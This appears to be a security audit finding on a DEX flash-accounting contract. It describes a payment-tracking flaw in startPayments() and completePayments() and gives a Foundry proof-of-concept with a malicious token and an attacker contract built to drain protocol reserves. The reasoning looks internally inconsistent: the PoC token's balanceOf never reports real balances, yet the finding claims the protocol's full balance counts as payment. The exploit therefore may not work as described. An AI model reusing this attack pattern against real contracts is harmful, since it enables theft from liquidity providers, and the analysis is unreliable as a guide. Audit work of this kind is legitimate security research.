## Title
Flash Accounting Payment Bypass via Malformed balanceOf Return Data

## Summary
The `startPayments()` function in `FlashAccountant.sol` incorrectly stores a value of `1` when a token's `balanceOf` call succeeds but returns less than 32 bytes of data. This causes `completePayments()` to count the protocol's entire token balance as payment, allowing attackers to clear flash loan debt without actually transferring tokens, violating the solvency invariant.

## Impact
**Severity**: High

## Finding Description

**Location:** `src/base/FlashAccountant.sol` - `startPayments()` function (lines 240-249) and `completePayments()` function (lines 283-287) [1](#0-0) 

**Intended Logic:** The `startPayments()` function should record the starting balance of tokens to later calculate payment amounts in `completePayments()`. The `+1` offset is added to distinguish between "not started" (0) and "started with 0 balance" (1). When a token's `balanceOf` fails or returns insufficient data, it should store `0`.

**Actual Logic:** When a token's `balanceOf` call returns `success=1` but with `returndatasize() < 32` bytes:
- The condition `gt(returndatasize(), 0x1f)` evaluates to `0`
- `tokenBalance = mload(returnLocation) * (0 && 1) = 0`
- But `success = 1`, so the stored value becomes `0 + 1 = 1`

This creates a critical inconsistency. In `completePayments()`, the payment calculation is: [2](#0-1) 

When `lastBalance = 1`, this evaluates to:
- Condition: `1 > 0 && currentBalance >= 1` 
- Payment: `currentBalance - (1 - 1) = currentBalance - 0 = currentBalance`

The entire current balance is incorrectly counted as payment, even though no actual transfer occurred.

**Exploitation Path:**

1. **Deploy/Use Malicious Token**: Attacker deploys or identifies a token whose `balanceOf()` function succeeds (returns `true`) but returns less than 32 bytes of data. This could be intentional or a buggy token implementation.

2. **Establish Protocol Balance**: Ensure the Core contract (which is a singleton holding all tokens for all pools) has a balance of this token through normal DEX operations or by providing liquidity themselves initially.

3. **Initiate Flash Loan**: Attacker calls `lock()` to begin a flash accounting session.

4. **Withdraw Tokens**: Within the lock callback, attacker calls `withdraw()` to borrow X amount of the malicious token, creating debt of X: [3](#0-2) 

5. **Trigger Payment Tracking Bug**: Attacker calls `startPayments([maliciousToken])`, which records `lastBalance = 1` instead of the actual balance + 1.

6. **Clear Debt Without Payment**: Attacker calls `completePayments([maliciousToken])` without transferring any tokens. The function calculates `payment = currentBalance` (e.g., 1000 tokens from protocol's reserves) and reduces debt: [4](#0-3) 

7. **Successful Theft**: If the protocol's balance ≥ attacker's debt, the debt is cleared using the protocol's own funds. The lock completes successfully, and the attacker keeps the withdrawn tokens without repayment.

**Security Property Broken:** 
- **Solvency Invariant**: "Pool balances of token0 and token1 must NEVER go negative (sum of all deltas must maintain non-negative balances)" - The protocol's token balance is effectively stolen, reducing net reserves.
- **Flash Accounting Invariant**: "All flash loans must be repaid within the same transaction with proper accounting" - The attacker repays nothing but debt is cleared.

## Impact Explanation

- **Affected Assets**: Any token balance held by the Core contract (singleton DEX holding all pool liquidity) that can be manipulated to return success with insufficient data from `balanceOf()`.

- **Damage Severity**: Attacker can drain the entire balance of affected tokens from the protocol. In a singleton DEX architecture where the Core contract holds all liquidity across all pools, this could represent millions of dollars worth of assets. The attack can be repeated for multiple tokens if multiple malicious/buggy tokens exist in the protocol.

- **User Impact**: All liquidity providers and traders lose funds when pool reserves are drained. Positions become unwithdrawable due to insufficient reserves. The entire protocol becomes insolvent for affected token pairs.

## Likelihood Explanation

- **Attacker Profile**: Any unprivileged user can execute this attack. No special permissions, large capital, or complex MEV infrastructure required.

- **Preconditions**: 
  - A token exists whose `balanceOf()` succeeds but returns < 32 bytes of data (malicious deployment or buggy implementation)
  - The Core contract has a non-zero balance of this token (likely if the token is used in any pool)
  - Attacker can withdraw an amount ≤ Core's balance to avoid debt underflow

- **Execution Complexity**: Single transaction with straightforward function calls: `lock()` → `withdraw()` → `startPayments()` → `completePayments()`. No timing dependencies or multi-block operations required.

- **Frequency**: Can be executed repeatedly until the Core contract's balance of affected tokens is fully drained. Can also be executed across multiple malicious tokens simultaneously.

## Recommendation

Fix the logic error in `startPayments()` to properly handle the case when `balanceOf()` succeeds but returns insufficient data. The stored value should be `0` (not `1`) when return data is invalid, treating it the same as a failed call:

```solidity
// In src/base/FlashAccountant.sol, function startPayments, lines 240-249:

// CURRENT (vulnerable):
// When success=1 but returndatasize<32, stores 1 instead of 0
let tokenBalance :=
    mul(
        mload(returnLocation),
        and(
            gt(returndatasize(), 0x1f),
            success
        )
    )
tstore(add(_PAYMENT_TOKEN_ADDRESS_OFFSET, token), add(tokenBalance, success))

// FIXED:
// Only add the +1 offset when BOTH success AND sufficient return data
let validReturn := and(gt(returndatasize(), 0x1f), success)
let tokenBalance := mul(mload(returnLocation), validReturn)
tstore(add(_PAYMENT_TOKEN_ADDRESS_OFFSET, token), add(tokenBalance, validReturn))
```

**Alternative Mitigation**: Add explicit validation in `completePayments()` to detect suspicious payment calculations where `lastBalance = 1` but represents an uninitialized state rather than a legitimate zero-balance start.

## Proof of Concept

```solidity
// File: test/Exploit_FlashAccountingBypass.t.sol
// Run with: forge test --match-test test_StealProtocolFundsViaPaymentBypass -vvv

pragma solidity ^0.8.31;

import "forge-std/Test.sol";
import "../src/Core.sol";
import "../src/base/BaseLocker.sol";
import {TestToken} from "./TestToken.sol";

// Malicious token that returns success but insufficient data from balanceOf
contract MaliciousToken {
    mapping(address => uint256) public balances;
    
    function transfer(address to, uint256 amount) external returns (bool) {
        balances[msg.sender] -= amount;
        balances[to] += amount;
        return true;
    }
    
    function balanceOf(address) external pure returns (bool) {
        // Returns success (true) but only 1 byte instead of 32
        assembly {
            mstore(0x00, 0x01)
            return(0x00, 0x01) // Returns 1 byte, not 32
        }
    }
    
    function mint(address to, uint256 amount) external {
        balances[to] += amount;
    }
}

contract Attacker is BaseLocker {
    address public maliciousToken;
    uint128 public stolenAmount;
    
    constructor(IFlashAccountant accountant, address _token) BaseLocker(accountant) {
        maliciousToken = _token;
    }
    
    function attack(uint128 amount) external returns (bytes memory) {
        stolenAmount = amount;
        return lock(abi.encode(amount));
    }
    
    function handleLockData(uint256, bytes memory data) internal override returns (bytes memory) {
        uint128 amount = abi.decode(data, (uint128));
        
        // Step 1: Withdraw tokens (create debt)
        ACCOUNTANT.withdraw(maliciousToken, address(this), amount);
        
        // Step 2: Call startPayments - will record lastBalance = 1 due to malformed return
        bytes memory startData = abi.encodePacked(
            IFlashAccountant.startPayments.selector,
            abi.encode(maliciousToken)
        );
        (bool success1,) = address(ACCOUNTANT).call(startData);
        require(success1, "startPayments failed");
        
        // Step 3: Call completePayments - will count entire balance as payment
        bytes memory completeData = abi.encodePacked(
            IFlashAccountant.completePayments.selector,
            abi.encode(maliciousToken)
        );
        (bool success2,) = address(ACCOUNTANT).call(completeData);
        require(success2, "completePayments failed");
        
        // Debt is now cleared without actually paying anything!
        return "";
    }
}

contract Exploit_FlashAccountingBypass is Test {
    Core public core;
    MaliciousToken public maliciousToken;
    Attacker public attacker;
    address public victim = address(0xdead);
    
    function setUp() public {
        // Deploy Core (FlashAccountant)
        core = new Core();
        
        // Deploy malicious token
        maliciousToken = new MaliciousToken();
        
        // Simulate protocol having balance (from other users' deposits)
        maliciousToken.mint(address(core), 1000 ether);
        
        // Deploy attacker contract
        attacker = new Attacker(IFlashAccountant(payable(address(core))), address(maliciousToken));
    }
    
    function test_StealProtocolFundsViaPaymentBypass() public {
        // SETUP: Record initial balances
        uint256 coreInitialBalance = maliciousToken.balances(address(core));
        uint256 attackerInitialBalance = maliciousToken.balances(address(attacker));
        
        console.log("Core initial balance:", coreInitialBalance);
        console.log("Attacker initial balance:", attackerInitialBalance);
        
        // EXPLOIT: Attack with amount <= Core's balance to avoid underflow
        uint128 stealAmount = 500 ether;
        attacker.attack(stealAmount);
        
        // VERIFY: Attacker successfully stole tokens without repayment
        uint256 coreAfterBalance = maliciousToken.balances(address(core));
        uint256 attackerAfterBalance = maliciousToken.balances(address(attacker));
        
        console.log("Core after balance:", coreAfterBalance);
        console.log("Attacker after balance:", attackerAfterBalance);
        
        assertEq(
            attackerAfterBalance - attackerInitialBalance,
            stealAmount,
            "Attacker should have stolen tokens"
        );
        assertEq(
            coreInitialBalance - coreAfterBalance,
            stealAmount,
            "Core should have lost tokens"
        );
        assertGt(
            attackerAfterBalance,
            attackerInitialBalance,
            "Vulnerability confirmed: Attacker stole tokens without repayment by exploiting payment tracking bug"
        );
    }
}
```

## Notes

This vulnerability exploits a logic error in how the protocol handles edge cases in token balance queries. While the issue requires a non-standard token (one that returns success with insufficient data from `balanceOf`), the protocol explicitly attempts to handle such cases via the `gt(returndatasize(), 0x1f)` check but does so incorrectly. The bug is in the protocol's implementation, not just "don't use weird tokens."

The singleton architecture exacerbates the impact, as the Core contract holds all liquidity for all pools, making large-scale fund theft possible if any affected token exists in the system.

### Citations

**File:** src/base/FlashAccountant.sol (L240-249)
```text
                let tokenBalance :=
                    mul(
                        mload(returnLocation),
                        and(
                            gt(returndatasize(), 0x1f), // At least 32 bytes returned.
                            success
                        )
                    )

                tstore(add(_PAYMENT_TOKEN_ADDRESS_OFFSET, token), add(tokenBalance, success))
```

**File:** src/base/FlashAccountant.sol (L283-287)
```text
                let payment :=
                    mul(
                        and(gt(lastBalance, 0), not(lt(currentBalance, lastBalance))),
                        sub(currentBalance, sub(lastBalance, 1))
                    )
```

**File:** src/base/FlashAccountant.sol (L299-307)
```text
                    let deltaSlot := add(_DEBT_LOCKER_TOKEN_ADDRESS_OFFSET, add(shl(160, id), token))
                    let current := tload(deltaSlot)

                    // never overflows because of the payment overflow check that bounds payment to 128 bits
                    let next := sub(current, payment)

                    nzdCountChange := add(nzdCountChange, sub(iszero(current), iszero(next)))

                    tstore(deltaSlot, next)
```

**File:** src/base/FlashAccountant.sol (L336-342)
```text
                    let deltaSlot := add(_DEBT_LOCKER_TOKEN_ADDRESS_OFFSET, add(shl(160, id), token))
                    let current := tload(deltaSlot)
                    let next := add(current, amount)

                    nzdCountChange := add(nzdCountChange, sub(iszero(current), iszero(next)))

                    tstore(deltaSlot, next)
```
